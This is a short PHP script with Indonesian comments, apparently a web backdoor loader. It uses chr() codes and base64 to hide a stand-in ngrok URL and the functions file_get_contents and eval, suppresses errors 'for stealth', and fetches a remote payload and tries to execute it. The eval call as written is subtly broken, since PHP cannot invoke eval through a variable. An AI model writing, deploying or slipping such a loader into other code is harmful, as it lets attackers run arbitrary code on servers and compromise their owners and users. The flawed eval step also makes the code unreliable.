<?php
error_reporting(0); // Sembunyikan error (opsional, untuk stealth)

function x($c){return chr($c);}
$p = strrev(x(100).x(97).x(116).x(97).x(99).x(111).x(109).x(109).x(97).x(110).x(100));
$h = x(104).x(116).x(116).x(112).x(115).x(58).x(47).x(47).x(121).x(111).x(117).x(114).x(115).x(101).x(114).x(118).x(101).x(114).x(46).x(110).x(103).x(114).x(111).x(107).x(46).x(105).x(111).x(47).x(112).x(97).x(121).x(108).x(111).x(97).x(100).x(46).x(116).x(120).x(116);

$g = base64_decode('ZmlsZV9nZXRfY29udGVudHM='); // file_get_contents
$e = 'ZXZhbA=='; // eval
$u = 'dXJsZGVjb2Rl'; // urldecode

$q = base64_decode($e); // eval
$w = base64_decode($u); // urldecode

// Ambil konten dari URL
$content = @$g($h); // @ untuk suppress warning

if ($content !== false && !empty($content)) {
    // Decode ?%3f%3e → ?>, lalu gabungkan dengan konten
    $payload = $w('%3f%3e') . $content;
    // Eksekusi
    @$q($payload);
} else {
    // Fallback jika gagal ambil file
    echo "Failed to load payload.";
}
?>
